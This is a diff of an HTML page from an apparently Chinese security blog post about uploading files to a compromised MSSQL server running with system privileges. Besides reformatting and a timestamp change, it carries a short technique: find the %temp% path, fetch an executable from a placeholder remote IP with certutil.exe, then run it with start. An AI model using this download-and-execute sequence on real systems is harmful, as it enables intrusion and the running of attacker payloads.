@@ -16,7 +16,7 @@
 <meta property="og:description" content="mssql system权限上传文件 权限不够无法上传文件到任何目录">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssql%20system%E6%9D%83%E9%99%90%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6&#x2F;1.png">
-<meta property="og:updated_time" content="2019-12-13T03:01:25.046Z">
+<meta property="og:updated_time" content="2020-02-10T03:29:13.980Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;mssql%20system%E6%9D%83%E9%99%90%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6&#x2F;1.png">
   
@@ -183,12 +183,18 @@
 <a id="more"></a>
 
 <p>使用当前用户临时文件目录</p>
-<p>echo %temp% 命令 找临时文件绝对路径</p>
+<ul>
+<li>echo %temp% 命令 找临时文件绝对路径</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/mssql%20system%E6%9D%83%E9%99%90%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/1.png" alt="img"></p>
 <p>使用命令远程下载</p>
-<p>certutil.exe -urlcache -split -f <a href="http://xxx.xxx.xxx.xxx/xxx.exe" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/xxx.exe</a> %temp%\xxx.exe</p>
+<ul>
+<li>certutil.exe -urlcache -split -f <a href="http://xxx.xxx.xxx.xxx/xxx.exe" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/xxx.exe</a> %temp%\xxx.exe</li>
+</ul>
 <p>最后执行文件</p>
-<p> start %temp%/xxx.exe</p>
+<ul>
+<li>start %temp%/xxx.exe</li>
+</ul>
 
       
 
